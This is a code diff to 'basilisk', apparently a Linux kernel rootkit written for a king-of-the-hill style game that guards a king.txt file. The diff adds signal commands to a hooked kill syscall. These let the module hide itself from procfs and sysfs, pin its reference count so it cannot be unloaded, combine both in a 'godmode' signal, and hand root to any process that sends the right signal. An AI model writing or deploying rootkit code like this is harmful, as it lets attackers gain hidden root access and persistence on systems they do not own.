@@ -18,9 +18,11 @@
 #include "include/stealth_helper.h"
 
 
-// Macros for the kill hook commands
-#define SIG_HIDE 63;
-#define SIG_ROOT 64;
+// Macros for the kill hook commands (documented at the kill_hook)
+#define SIG_HIDE 63
+#define SIG_ROOT 64
+#define SIG_PROTECT 32
+#define SIG_GODMODE 38
 
 // Macros for protecting king.txt
 #define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
@@ -38,7 +40,9 @@ MODULE_VERSION("2.0");
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
-static short hidden = 0;
+static short hidden = 0; // toggle for hiding from sysfs/procfs
+static short protected = 0; // toggle for inc/decrementing module ref count (un/protecting it from being removed)
+
 static struct file_operations *king_fops;
 static DEFINE_RWLOCK(king_fops_lock);
 
@@ -228,8 +232,10 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
 Kill syscall hook.
 Intercepts signals to communicate with the adversary.
 
-Signal SIG_HIDE calls hide_basilisk/show_basilisk depending on the `hidden` toggle
-Signal SIG_ROOT calls set_root
+SIG_HIDE calls handle_lkm_hide (hide/show from sysfs/procfs)
+SIG_PROTECT calls handle_lkm_protect (increase/decrease the module ref count)
+SIG_GODMODE calls handle_lkm_hide AND handle_lkm_protect
+SIG_ROOT calls set_root (give root to the caller process)
 
 Otherwise it calls the original kill syscall.
 */
@@ -239,9 +245,9 @@ static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 asmlinkage int hook_kill(const struct pt_regs *regs)
 { 
+ /* declare required prototypes (defined below, for clarity) */
     void set_root(void);
-    void show_basilisk(void);
-    void hide_basilisk(void);
+    void handle_lkm_hide(void);
     
     int sig = regs->si;
 
@@ -250,11 +256,20 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
             handle_lkm_hide();
             break;
 
-        case SIG_ROOT:
-            printk(KERN_INFO "basilisk: giving root...\n");
-            set_root();
+        case SIG_PROTECT:
+            handle_lkm_protect(&protected);
             break;
         
+        case SIG_GODMODE:
+            handle_lkm_hide();
+            handle_lkm_protect(&protected);
+            break;
+
+        case SIG_ROOT:
+            pr_info("basilisk: giving root...\n");
+            set_root();
+            break;
+
         default:
             return orig_kill(regs);
     }
@@ -268,19 +283,27 @@ static asmlinkage long (*orig_kill)(pid_t pid, int sig);
 asmlinkage int hook_kill(pid_t pid, int sig)
 {
     void set_root(void);
-    void show_basilisk(void);
-    void hide_basilisk(void);
-    
+    void handle_lkm_hide(void);
+
     switch (sig) {
         case SIG_HIDE:
             handle_lkm_hide();
             break;
 
+        case SIG_PROTECT:
+            handle_lkm_protect(&protected);
+            break;
+        
+        case SIG_GODMODE:
+            handle_lkm_hide();
+            handle_lkm_protect(&protected);
+            break;
+
         case SIG_ROOT:
-            printk(KERN_INFO "basilisk: giving root...\n");
+            pr_info("basilisk: giving root...\n");
             set_root();
             break;
-       
+
         default:
             return orig_kill(pid, sig);
     }
@@ -294,11 +317,11 @@ Helper function to handle hiding/showing our LKM
 void handle_lkm_hide(void)
 {
     if(!hidden) {
-        pr_info("basilisk: hiding kernel module...\n");
+        pr_info("basilisk: hiding kernel module\n");
         proc_hide();
         sys_hide();
     } else {
-        pr_info("basilisk: showing kernel module...\n");
+        pr_info("basilisk: showing kernel module\n");
         proc_show();
         sys_show();
     }
